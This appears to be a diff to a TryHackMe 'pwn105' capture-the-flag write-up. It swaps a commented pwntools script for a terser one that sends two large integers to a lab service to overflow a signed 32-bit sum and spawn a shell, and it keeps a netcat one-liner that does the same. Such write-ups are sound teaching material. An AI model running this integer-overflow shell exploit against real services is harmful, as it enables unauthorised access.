@@ -190,40 +190,20 @@ Alternatively, you can pipe the two numbers in a single shell command:
 (printf "2000000000\n500000000\n"; cat) | nc <TARGET_IP> 9005
 ```
 
-### Optional Automation Script (`exploit.py`)
+### Exploit Script (`exploit.py`)
 
-For automated testing or CTF harness integration, an optional Python script is provided in [`exploit.py`](exploit.py):
+The automated Python exploit script using `pwntools` is maintained in [`exploit.py`](exploit.py):
 
 ```python
 #!/usr/bin/env python3
-"""TryHackMe - pwn105 Automation Script
-Vulnerability: Signed 32-bit Integer Overflow
-Concept: Sum of two large positive integers exceeds INT_MAX (0x7FFFFFFF),
-         wrapping around to a negative value to trigger system("/bin/sh").
-"""
-
 from pwn import *
-import sys
 
-def start():
-    if args.REMOTE:
-        # python3 exploit.py REMOTE <IP> 9005
-        return remote(sys.argv[1], int(sys.argv[2]))
-    return process("./pwn105-1644300421555.pwn105")
+p = remote('10.64.169.126', 9005)
 
-p = start()
-
-# Two large positive numbers whose sum exceeds 2,147,483,647 (INT_MAX)
-num1 = b"2000000000"
-num2 = b"500000000"
-
-p.recvuntil(b"]>> ")
-p.sendline(num1)
-
-p.recvuntil(b"]>> ")
-p.sendline(num2)
-
-log.success("Integer overflow triggered! Enjoy your shell.")
+p.recvuntil(b'> ')
+p.sendline(b'2000000000')
+p.recvuntil(b'> ')
+p.sendline(b'500000000')
 p.interactive()
 ```
 
